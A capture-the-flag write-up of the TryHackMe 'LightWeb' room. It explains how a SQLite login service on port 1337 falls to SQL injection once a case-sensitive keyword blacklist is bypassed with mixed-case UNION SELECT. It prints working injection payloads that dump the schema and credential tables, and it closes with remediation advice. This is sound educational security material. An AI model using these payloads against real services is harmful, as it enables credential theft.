Beating a keyword-blacklist WAF with SQL injection

A login service on a raw TCP port hid a SQLite database behind a naïve keyword filter. The whole room comes down to one idea: mixed-case keywords slip straight past the blacklist.

TryHackMeRoom LightWeb · SQLiDifficulty Easy
SQL injectionSQLiteWAF bypassUNION-based
TL;DR

A service on TCP 1337 returns a user's password for any username — a classic injectable SELECT ... WHERE username='<input>'. The filter blocks comments and the words union/select, but only by exact case. Since SQL keywords are case-insensitive to the engine, UnIoN SeLeCt walks through. From there a single-column UNION plus group_concat() dumps every credential and the flag.

01The target

Two open ports: SSH (22) and an unknown service on 1337. Talking to it over netcat reveals a database front-end that prints a user's password back to you — so it's running something like SELECT password FROM users WHERE username='<input>'. A single quote confirms the injection and leaks the query's tail:

confirm injection
$ nc 10.10.x.x 1337
Please enter your username: '
Error: unrecognized token: "''' LIMIT 30" # SQLite + trailing LIMIT 30

The database credentials aren't system users, so they're useless over SSH — the objective lives inside the database, reachable only through this injection.

02Beating the filter · the interesting bit

Probing the input shows a blacklist: comments (--, /*, %0b) and the words union and select are rejected. Two problems, two tricks:

  • Case bypass. Nesting (UNunionION) fails — the substring is still there. But the filter only matches fixed cases, while the SQL engine ignores case entirely, so UnIoN / SeLeCt sail through.
  • No comment needed. Can't comment out the trailing ' LIMIT 30? End the payload with an open quote and let the query's own ' close it — a tautology like WhERe '1'='1 absorbs the tail.
the bypass
username: union → word I don't like :(
username: UnIoN → passes the filter
username: 0' UnIoN SeLeCt 1,' → SQL error: column count # inside the query

03Dumping the database

One column is reflected (the value printed after Password:). I read the schema from sqlite_master, then concatenated each table's rows with group_concat(), using char(58)/char(10) as separators to avoid quotes.

schema → exfiltration
0' UnIoN SeLeCt group_concat(sql) FRoM sqlite_master WhERe '1'='1
→ usertable(id,username,password) · admintable(id,username,password)
0' UnIoN SeLeCt group_concat(username||char(58)||password,char(10)) FRoM admintable WhERe '1'='1
→ TryHackMeAdmin:███████████ · flag:THM{█████████████}

Both credential tables fall out of a single unauthenticated field, flag included (redacted here).

Fix Use parameterised queries — they make injection structurally impossible. A keyword blacklist is not a boundary: validate with an allowlist, drop the service's habit of echoing stored passwords, and keep it behind authentication.

Tested against an intentionally vulnerable TryHackMe lab I'm authorised to attack. Credentials and the flag are redacted.
